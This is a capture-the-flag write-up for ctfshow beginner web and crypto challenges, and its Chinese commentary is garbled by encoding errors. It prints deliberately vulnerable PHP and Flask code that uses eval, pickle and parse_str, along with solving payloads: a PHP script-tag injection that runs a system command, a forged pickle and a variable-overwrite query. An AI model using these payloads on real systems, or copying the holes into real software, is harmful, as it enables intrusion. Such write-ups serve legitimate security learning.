## web

### easy_eval

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$code = $_POST['code'];

if(isset($code)){

  $code = str_replace("?","",$code);
  eval("?>".$code);

}
```

è¿‡æ»¤äº†`?`ï¼Œè€Œä¸”é—­åˆäº†å½“å‰ä»£ç 

```php
code=<script language="php">system('cat /f1agaaa ');</script>
```

è¿™ç§æ–¹æ³•**php7.0.0**å‰è¿˜å¯ä»¥ç”¨

æœ¬é¢˜

![image-20221003204659414](D:\Typora\note\CTF\web\æ¯”èµ›wp\æ–°æ‰‹æ¯.assets\image-20221003204659414.png)

### baby_pickle

```py
# Author:
#   Achilles
# Time:
#   2022-9-20
# For:
#   ctfshow
import base64
import pickle, pickletools
import uuid
from flask import Flask, request

app = Flask(__name__)
id = 0
flag = "ctfshow{" + str(uuid.uuid4()) + "}"

class Rookie():
    def __init__(self, name, id):
        self.name = name
        self.id = id


@app.route("/")
def agent_show():
    global id
    id = id + 1

    if request.args.get("name"):
        name = request.args.get("name")
    else:
        name = "new_rookie"

    new_rookie = Rookie(name, id)
    try:
        file = open(str(name) + "_info", 'wb')
        info = pickle.dumps(new_rookie, protocol=0)
        info = pickletools.optimize(info)
        file.write(info)
        file.close()
    except Exception as e:
        return "error"

    with open(str(name)+"_info", "rb") as file:
        user = pickle.load(file)

    message = "<h1>æ¬¢è¿æ¥åˆ°æ–°æ‰‹æ‘" + user.name + "</h1>\n<p>" + "åªæœ‰æˆä¸ºå¤§èœé¸¡æ‰èƒ½å¾—åˆ°flag" + "</p>"
    return message


@app.route("/dacaiji")
def get_flag():
    name = request.args.get("name")
    with open(str(name)+"_info", "rb") as f:
        user = pickle.load(f)

    if user.id != 0:
        message = "<h1>ä½ ä¸æ˜¯å¤§èœé¸¡</h1>"
        return message
    else:
        message = "<h1>æ­å–œä½ æˆä¸ºå¤§èœé¸¡</h1>\n<p>" + flag + "</p>"
        return message


@app.route("/change")
def change_name():
    name = base64.b64decode(request.args.get("name"))
    newname = base64.b64decode(request.args.get("newname"))

    file = open(name.decode() + "_info", "rb")
    info = file.read()
    print("old_info ====================")
    print(info)
    print("name ====================")
    print(name)
    print("newname ====================")
    print(newname)
    info = info.replace(name, newname)
    print(info)
    file.close()
    with open(name.decode()+ "_info", "wb") as f:
        f.write(info)
    return "success"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8888)
```

æºç å¯ä»¥çœ‹åˆ°å¯¹äºæ”¹çš„åå­—æ²¡æœ‰ä»»ä½•è¿‡æ»¤

å…ˆåˆ›å»ºä¸€ä¸ªç”¨æˆ·`?name=ha`

ç„¶åæŒ‰infoæ–‡ä»¶ä¼ªé€ idä¸º0

![image-20221003233741142](D:\Typora\note\CTF\web\æ¯”èµ›wp\æ–°æ‰‹æ¯.assets\image-20221003233741142.png)



`/change?name=aGE%3D&newname=aGEKc1ZpZApJMApzYi4%3D`

å†è®¿é—®

`/dacaiji?name=ha`å³å¯å¾—åˆ°flag

### repairman

```php
<?php
error_reporting(0);
session_start();
$config['secret'] = Array();
include 'config.php';
if(isset($_COOKIE['secret'])){
    $secret =& $_COOKIE['secret'];
}else{
    $secret = Null;
}

if(empty($mode)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query']);
    if(empty($mode)) {
        echo 'Your mode is the guest!';
    }
}

function cmd($cmd){
    global $secret;
    echo 'Sucess change the ini!The logs record you!';
    exec($cmd);
    $secret['secret'] = $secret;
    $secret['id'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['secret'] = $secret;
}

if($mode == '0'){
    //echo var_dump($GLOBALS);
    if($secret === md5('token')){
        $secret = md5('test'.$config['secret']);
        }

        switch ($secret){
            case md5('admin'.$config['secret']):
                echo 999;
                cmd($_POST['cmd']);
            case md5('test'.$config['secret']):
                echo 666;
                $cmd = preg_replace('/[^a-z0-9]/is', 'hacker',$_POST['cmd']);
                cmd($cmd);
            default:
                echo "hello,the repairman!";
                highlight_file(__FILE__);
        }
    }elseif($mode == '1'){
        echo '</br>hello,the user!We may change the mode to repaie the server,please keep it unchanged';
    }else{
        header('refresh:5;url=index.php?mode=1');
        exit;
    }
```

ä»£ç çœ‹ç€å¾ˆé•¿ï¼Œå…¶å®å°±æ˜¯ç©çš„ä¸€ä¸ªé€»è¾‘

æœ€å…³é”®çš„åœ°æ–¹

```php
if(empty($mode)){
    $url = parse_url($_SERVER['REQUEST_URI']);
    parse_str($url['query']);
    if(empty($mode)) {
        echo 'Your mode is the guest!';
    }
}
```

**parse_str($url['query']);**

è¿™ä¸€æ­¥è¿›è¡Œäº†å˜é‡è¦†ç›–ï¼Œé‚£ä¹ˆ`$secretå’Œ$config`å°±å¯ä»¥éšæ„æ”¹å˜

```php
?mode=0&secret=e00cf25ad42683b3df678c61f42c6bda&config=1
```

ç„¶å**ncè¿æ¥ä¹‹åæ‹¿åˆ°flag**

## crypto

### easy_base

`=0XezFWZfNXafRjNlNXYit3dvh2cmR3Y`ï¼Œå€’è¿‡æ¥base64å¾—åˆ°flag

### å‡¯æ’’å¯†ç 

```py
from string import ascii_lowercase
from random import shuffle,randint

table=list(ascii_lowercase)
shuffle(table)
flag='ctfshow{xxx}'
key=randint(0,25)
text=[]
for i in flag:
    if i in table:
        text.append(table[(table.index(i)+key)%26])
    else:
        text.append(i)
print(table)
print(text)
# ['h', 'g', 'u', 'p', 'o', 'v', 'n', 'b', 'i', 'j', 'y', 'k', 'a', 'z', 'w', 'q', 't', 'l', 'r', 'd', 'x', 'e', 's', 'm', 'c', 'f']
# ['r', 'y', 'd', 't', 'x', 'c', 'i', '{', 'y', 'x', '1', 't', '_', 'u', 't', '_', 'z', '1', 'd', 'd', 'a', 'q', 'h', 'y', '_', 'r', '4', 'q', 't', 'n', 'a', '!', '!', '}']

```

å°±æ˜¯æ¢äº†å­—å…¸çš„å‡¯æ’’ï¼Œæ ¹æ®å‰å‡ ä½æ±‚å‡º**key**ä¸º20

**exp**(è‡ªå·±è¡¥ä¸Šæ•°å­—å’Œç¬¦å·ğŸ˜¥)

```py
so='hgupovnbijykazwqtlrdxesmcf'
a='rydtxci{yx1t_ut_z1ddaqhy_r4qtna!!}'
b=['{','}','_','!']
c=[]
for i in a:
    for j in range(0,25):
        if i==so[j]:
            c.append(j)
for i in c:
    if i+6>25:
        print(so[i+6-26],end='')
    else:
        print(so[i+6],end='')
```

















